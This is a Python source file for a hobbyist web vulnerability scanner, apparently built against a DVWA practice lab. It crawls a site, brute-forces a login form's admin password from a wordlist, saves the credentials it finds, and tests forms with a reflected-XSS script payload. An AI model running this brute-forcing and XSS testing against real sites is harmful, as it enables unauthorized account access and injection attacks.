from spider import Spider
from bs4 import BeautifulSoup
import argparse, requests, json, re
from urllib.parse import urljoin

class fc:
    rw = '\033[31;107m'
    r = '\033[38;5;196m'
    pv = '\033[38;5;206;48;5;57m'
    end = '\033[0m'
    p = '\033[38;5;206m'
    y = '\033[0;33;40m'
    pu = '\033[0;35m'
    wg = '\033[37;42m'
    cy = '\033[36m'
    g = '\033[38;5;154m'
    b = '\033[38;5;45m'

class Args:
    def __init__(self):
        parser = argparse.ArgumentParser()
        parser.add_argument('-u','--url',dest = 'url', help = 'Enter target URL.')
        options = parser.parse_args()
        self.url = options.url

class Vulnscan:
	def __init__(self,url): 
		self.spider = Spider(url,['http://192.168.86.115/dvwa/logout.php'])
		self.url = url
		
	def runSpider(self): # run spider will test the site and return list of what it can access
		self.spider.run()
		if len(self.spider.storeLinks) > 0:
			# for link in self.spider.storeLinks:
			# 	print(f'{fc.b}{link}{fc.end})
			return self.spider.storeLinks
		else:
			print('List is empty, check link and try again')

	def testCreds(self,lst):
		for link in lst:
			response = self.spider.reqGet(link)
			if b'action=' in response and b'login.php' in response:
				forms = self.spider.getForms(link)
				if len(forms) == 1:
					action = forms[0].get('action')
					if 'login' in action:
						form = forms[0]
						action = form.get('action')
						fullurl = (urljoin(link, action))
						inputList = form.findAll('input')
						print(
							f'\n{fc.p}Link: {link}{fc.end}\n'
							f'{fc.p}Action: {action}{fc.end}'
							)
						postData = {}
						for i in inputList:
							#print(i.get('name')) # pass in the name of each input into dict of data
							#print(i.get('type'))
							#print(i.get('value'))
							if i.get('value') == None:
								postData[i.get('name')] = ''
							else:
								postData[i.get('name')] = i.get('type')
						creds = self.returnCreds(fullurl,postData,'admin')
						if creds:
							print(
							f'{fc.pv}[+]{fc.end} {fc.g}Credentials found for {fc.y}{fullurl}{fc.end}'
							)
							with open('creds.txt','w') as writeCred:
								writeCred.write(fullurl)
								writeCred.write(',')
								writeCred.write(json.dumps(creds))
								writeCred.write('\n')
							#return[fullurl,creds] # write to a file instead of returning, could exit loop early 
		
	def login(self,url=None,data=None):
		try:
			with open('creds.txt','r') as creds:
				for line in creds:
					if 'http' in line:
						url = line.strip()
					if '{' in line:
						#print(type(line))
						data = json.loads(line)
						#print(type(data))
		except FileNotFoundError:
			print(f'{fc.r}Creds file not found, run testCreds on target{fc.end}')
		print('\n',f'{fc.pu}={fc.end}'*50)
		print(f'Login session: {fc.wg}{self.spider.session}{fc.end}')
		print(
		f'{fc.y}Logging in{fc.end}\n'
		f'{fc.b}URL:{fc.end} {fc.g}{url}{fc.end}\n'
		f'{fc.b}data:{fc.end} {fc.g}{data}{fc.end}'
		)
		login = self.spider.session.post(url,data=data)
		if login.status_code == 200:
			print(f'{fc.g}{login.status_code} OK{fc.end}\nLogged in to {fc.cy}{url}{fc.end}')
			print(f'{fc.pu}={fc.end}'*50,'\n')
		else:
			print(f'{fc.r}URL or connection error{fc.end}')
	
	def returnCreds(self,url,data,user):
		if list(data.keys())[0] == 'username':
			data['username'] = user
		with open('/opt/wordlists/passwords.txt','r') as rf:
			for password in rf:
				password = password.strip()
				data['password'] = password
				resp = requests.post(url,data = data,timeout=5) #http://192.168.86.115/dvwa/login.php, passing in data dictionary to post request
				if b'Login failed' not in resp.content and b'Authentication Error' not in resp.content:#<div class="message">Login failed</div>, if password is successful:
					#print(f'URL: {url}\nStatus code: {resp.status_code}\nCredentials: {data}\n')
					return data
			print(f'{fc.r}Password not found for {url}{fc.end}')
	
	def listLinks(self,lst):
		for link in lst:
			print(f'{fc.b}{link}{fc.end}')

	def checkForms(self,lst): #pass in a list to check each link for forms
		for link in lst:
			#print(f'{fc.g}{link}{fc.end}')
			forms = self.spider.getForms(link)
			if forms:
				print(f'{fc.r}{link}{fc.end}\n{fc.b}{forms}{fc.end}')

	

#########################################################RUN#######################################################

args = Args()
# v1 = Vulnscan(args.url)
# v1.runSpider()
# #v1.checkForms(v1.spider.storeLinks)
# sesList = v1.testCreds(v1.spider.storeLinks)

v2 = Vulnscan(args.url) # cant login with instance 1 and rerun the spider so start a new instance and login first using creds gathered from instance 1 
v2.login()
print(v2.runSpider())
#print(v2.spider.reqGet('http://192.168.86.115/dvwa/vulnerabilities/xss_r'))

# forms = v2.spider.getForms('http://192.168.86.115/dvwa/vulnerabilities/xss_r')
# print(forms)
# testScript = '<sCript>alert("test")</scriPt>'
# response = (v2.spider.postForm(forms,testScript,'http://192.168.86.115/dvwa/vulnerabilities/xss_r'))
# print(testScript in str(response.content))
# THIS WORKS



#v2.checkForms(v2.spider.storeLinks)


# forms = v2.spider.getForms('http://192.168.86.115/dvwa/vulnerabilities/xss_r/')
# print(v2.spider.testXSS('http://192.168.86.115/dvwa/vulnerabilities/xss_r/',forms))
# print(v2.spider.testXSS('http://192.168.86.115/dvwa/vulnerabilities/xss_r/'))
# #THIS WORKS

# (v2.runSpider())
# (v2.spider.runScan())

v3 = Vulnscan(args.url)
v3.login()
v3.spider.runScan(v2.spider.storeLinks)
# for link in v2.spider.fuckedList:
# 	print(link)
# 	# forms = v3.spider.getForms('http://192.168.86.115/dvwa/vulnerabilities/xss_r/')
# 	# print(v3.spider.testXSS('http://192.168.86.115/dvwa/vulnerabilities/xss_r/',forms))
# 	forms = v3.spider.getForms(link)
# 	print(v3.spider.testXSS(link,forms))





























